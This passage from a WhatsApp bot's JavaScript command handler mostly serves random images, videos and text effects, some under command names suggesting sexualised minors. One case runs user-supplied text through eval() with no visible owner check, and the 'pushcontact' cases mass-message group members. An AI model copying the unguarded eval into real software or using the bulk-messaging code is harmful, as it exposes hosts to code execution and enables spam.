              link = "https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html";
            }
            if (/smokyneon/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html";
            }
            if (/starstext/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html";
            }
            if (/rainboweffect/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html";
            }
            if (/balloontext/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html";
            }
            if (/metalliceffect/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html";
            }
            if (/embroiderytext/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html";
            }
            if (/flamingtext/.test(command)) {
              link = "https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html";
            }
            let _0x3012b2 = await ephoto(link, q);
            Dare.sendMessage(_0x4c0fa5.chat, {
              image: {
                url: _0x3012b2
              },
              caption: `${mess.success}`
            }, {
              quoted: m
            });
          }
          break;

case 'tiktokgirl':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var asupan = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
Dare.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var gheayubi = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
Dare.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var bocil = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
Dare.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ukhty = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
Dare.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var santuy = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
Dare.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var kayes = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
Dare.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var rikagusriani = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
Dare.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'twagwan':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/tWagwanland.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepic':case 'ppcp':case 'couplepicture':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
Dare.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'animewallpaper2': case 'animewall2': {
if (!args.join(" ")) return replydare("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
anu = await wallpaper(args)
result = anu[Math.floor(Math.random() * anu.length)]
Dare.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break
case 'afk': {
if (!m.isGroup) return reply(mess.only.group)
if (!text) return replydare(`Example ${prefix+command} want to sleep`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
reply(`${m.pushName} Telah MelMelakukan AFK\nAlasan : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
case 'animewall': case 'animewallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replydare('What wallpaper do you want?')
reply(mess.wait)
const wall = new AnimeWallpaper()
    const pages = [1,2,3,4]
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null)
const i = Math.floor(Math.random() * wallpaper.length)    
            await Dare.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
return('Error!')
})
//Dare.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      Dare.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!🙂`}, {quoted: m})    
            }
            break
case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      Dare.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!🙂`}, {quoted: m})    
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      Dare.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!🙂`}, {quoted: m})    
            }
            break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
reply(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
Dare.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case '1>':
var err = new TypeError
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return replydare(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replydare(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replydare(util.format(_syntax + _err))
}
break
case 'pushcontact': {
    if (!DareTheCreator) return reply(mess.only.owner)
      if (!m.isGroup) return replydare(`The feature works only in grup`)
    if (!text) return replydare(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replydare(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    Dare.sendMessage(pler, { text: q})
     }  
     replydare(`Done`)
      }
      break
case 'pushcontact2':{
if (!DareTheCreator) return reply(mess.only.owner)
if (!q) return replydare(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
reply(mess.wait)
const metadata2 = await Dare.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
Dare.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replydare(`Success`)
}
break

case 'pushcontact3':
if (!DareTheCreator) return reply(`For Owners Only`)
if (!text) return reply(`Wrong Usage Please Use Command Like This\n${prefix+command} idgroup|pause|text\nTo See Group Id Please Type .idgroup`)
await reply("Otw Boskuuu ")
const groupMetadataa = !m.isGroup? await Dare.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
